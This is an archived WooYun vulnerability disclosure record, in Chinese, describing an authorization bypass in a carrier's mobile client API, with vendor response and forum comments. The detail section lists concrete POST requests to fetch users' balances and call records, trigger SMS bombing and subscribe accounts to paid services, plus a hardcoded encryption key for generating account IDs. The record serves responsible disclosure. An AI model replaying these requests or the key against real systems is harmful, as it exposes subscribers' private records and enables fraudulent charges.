{"id": 14188, "wybug_id": "wooyun-2013-017649", "wybug_title": "某运营商权限绕过漏洞可导致千万级敏感信息泄漏（包括通话纪录）", "wybug_corp": "189.cn", "wybug_author": "O.o", "wybug_date": "2013-01-22 08:41", "wybug_open_date": "2013-03-08 08:42", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当", "手机应用", "敏感数据未加密", "手机软件安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-02-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-02-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-02-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-03-08：\t细节向公众公开  简要描述： 泄漏信息过于敏感，实现方法过于简单，所以标题和描述不会泄漏信息的才好。 详细说明：  获取用户流量信息POST HTTP://wapsc.189.cn:8006/wapLogin/getFlow.actionPost值: accountid=用户ID &channelTypeId=001&cityCode=C0713CC421F4E2CF&cityName=%E5%9B%9B%E5%B7%9D+%E6%88%90%E9%83%BD&serviceId=2\n\n登陆客户端发短信（直接形成短信轰炸）POST HTTP://wapsc.189.cn:8006/wapLogin/sendSms.action数据:accountid=xxxxxxxxx&channelTypeId=001&cityCode=C0713CC421F4E2CF&cityName=%E5%9B%9B%E5%B7%9D+%E6%88%90%E9%83%BD&serviceId=2\n\n查询余额POST HTTP://wapsc.189.cn:8006/wapLogin/getReal.action数据accountid=xxxxxxxxxxxxx&channelTypeId=001&cityCode=C0713CC421F4E2CF&cityName=%E5%9B%9B%E5%B7%9D+%E6%88%90%E9%83%BD&serviceId=2\n\n基础业务情况POST HTTP://wapsc.189.cn:8006 /BasicBuss/getAllBasicBusiness.actionaccNbr=xxxxxxxxxx&channelTypeId=001&cityCode=C0713CC421F4E2CF&cityName=%E5%9B%9B%E5%B7%9D+%E6%88%90%E9%83%BD&serviceId=2\n\n套餐使用量查询POST HTTP://wapsc.189.cn:8006/productMessage/mealUseCase.action\t数据accountid=xxxxxxxxxxx&channelTypeId=001&cityCode=C0713CC421F4E2CF&cityName=%E5%9B%9B%E5%B7%9D+%E6%88%90%E9%83%BD&serviceId=2\n\n【通话详单】对，没看错。详单。详细到秒！POST HTTP://wapsc.189.cn:8006/BillDetails/getBillDetail.actionstartTime=20130120&endTime=20130121&accNbr=xxxxxxxxxxxxxxxx&type=21&channelTypeId=001&cityCode=C0713CC421F4E2CF&cityName=%E5%9B%9B%E5%B7%9D+%E6%88%90%E9%83%BD&serviceId=2\n\n还有些杂七杂八的接口看图把=。=\n\n\n\n\n\n还有一些远程操纵订购产品POST HTTP://wapsc.189.cn:8006/businessOperations/getAllValueAdds.actionaccountid=xxxxxxxxxxx&pageSize=10&currentPage=1&fuzzyStr=&doType=TYPE1&orderMsg=&isCall=true&channelTypeId=001&cityCode=C0713CC421F4E2CF&cityName=%E5%9B%9B%E5%B7%9D+%E6%88%90%E9%83%BD&serviceId=2会返回当前增值业务列表\n\n找到想要开通的服务，记下goodsId获取产品valueAddId，变量为goodsidPOST HTTP://wapsc.189.cn:8006/businessOperations/BusOperInfo.action HTTP/1.1accountid=xxxxxxxxxxxxxx&goodsId=100311&channelTypeId=001&cityCode=C0713CC421F4E2CF&cityName=%E5%9B%9B%E5%B7%9D+%E6%88%90%E9%83%BD&serviceId=2\n\n返回（QQ加油站为例）{\"goodsChannel\":\"ISMP\",\"goodsCode\":\"123000000000000000434\",\"goodsDesc\":\"<p>\\n\\t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; QQ加油站是腾讯的高端增值业务服务，QQ加油站用户能够享受到腾讯公司所提供的除普通功能以外的40多项增值服务内容。从网站到手机到客户端，QQ加油站用户可以享受比普通用户更多的乐趣，更多惊喜和更优质的服务。同时还可以参与线上线下活动，拥有其他精彩业务的打折特权。<\\/p>\\n<p>\\n\\t&nbsp;<\\/p>\\n<p>\\n\\t注：此业务属于代扣费（SP）类增值业务。<\\/p>\\n\",\"goodsId\":\"100311\",\"goodsName\":\"腾讯QQ加油站\",\"goodsPrice\":\"10\",\"service_Company\":\"深圳腾讯公司\"}取得goodsCode，订购任意附属包POST HTTP://wapsc.189.cn:8006/businessOperations/handleBusiness.action HTTP/1.1accountid=xxxxxxxxx&valueAddId=123000000000000000434&action=1&doType=ISMP&channelTypeId=001&cityCode=C0713CC421F4E2CF&cityName=%E5%9B%9B%E5%B7%9D+%E6%88%90%E9%83%BD&serviceId=2\n\n返回{\"effectiveTime\":\"\",\"expireTime\":\"20130121125312\",\"message\":\"成功\",\"resultCode\":\"0\"}订购成功，！=============华丽的分割线==============================Accountid获取算法在包里面有，自己可以写个生成main就能用。采用了DESede加密算法，采用A314BA5A3C85E86KK887WSWS为密钥   漏洞证明：  详细说明即为漏洞证明   修复方案：  后端多加点东西。具体你们比我懂   版权声明：转载请注明来源 O.o@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2013-01-24 23:52 厂商回复： CNVD确认并复现所述情况，已经在23日转由CNCERT四川分中心直接协调当地基础电信运营企业处置。按完全影响机密性（可遍历），部分影响完整性、可用性进行评分，基本危害评分8.97，发现技术难度系数1.1，涉及行业或单位影响系数1.4，综合rank=13.813 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-22 08:56 |    \t\tliyang \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:11        | 低调 沉默 守望)\t\t \n  关注~~坐等楼主上电视~~    \n     2013-01-22 09:15 |    \t\tShell \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | shell)\t\t \n  关注~~    \n     2013-01-22 10:10 |    \t\tqiaoy \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:16        )\t\t \n  .    \n     2013-01-22 10:21 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @only_guest 妹纸，来接客了    \n     2013-01-22 10:28 |    \t\t倒霉熊 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:6        | *好简要)\t\t \n  前排 接客了    \n     2013-01-22 11:16 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @易水寒    \n     2013-01-22 11:51 |    \t\tO.o \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:12        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  已经办好护照了。    \n     2013-01-22 15:57 |    \t\t易水寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:6        )\t\t \n  围观。    \n     2013-01-23 21:17 |    \t\t革命往事 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 革命已成往事)\t\t \n  猛烈的拖    \n     2013-01-23 22:46 |    \t\tO.o \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:12        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  @革命往事 难道大神您有防水表之神功？    \n     2013-01-23 22:49 |    \t\tO.o \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:12        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  还不确认么？确认了再奖励个同厂商的。另外还有个同厂商的正在截图~    \n     2013-01-25 09:51 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  这个是怎么挖掘到的？是手机客户端的接口吧    \n     2013-01-25 10:40 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @易水寒 赶紧发你的吧    \n     2013-01-25 17:44 |    \t\tO.o \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:12        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  @cncert国家互联网应急中心 PM了~    \n     2013-03-08 12:27 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  艾玛我去，通话记录完爆，要是手机上删除记录服务器上还是会有吧。。。    \n     2013-03-08 15:53 |    \t\tO.o \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:12        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  @疯狗 o(︶︿︶)o 唉    \n     2013-03-08 16:02 |    \t\t苏南同学 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 苏南同学，就是苏南同学~~~)\t\t \n  accountid是怎么得到的啊？    \n     2013-03-08 16:21 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @苏南同学 看文章最后几行    \n     2013-03-08 16:49 |    \t\t苏南同学 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 苏南同学，就是苏南同学~~~)\t\t \n  @疯狗 附件包没有附件包啊    \n     2013-03-08 18:16 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  手机应用？    \n     2013-03-08 18:17 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  ！！！    \n     2013-03-08 20:57 |    \t\t苏南同学 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 苏南同学，就是苏南同学~~~)\t\t \n  只有四川的号码可以测试    \n     2013-03-09 00:18 |    \t\tsipcer \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:9        )\t\t \n  @O.o 这洞是怎么挖的？accountid算法怎么得到的?    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}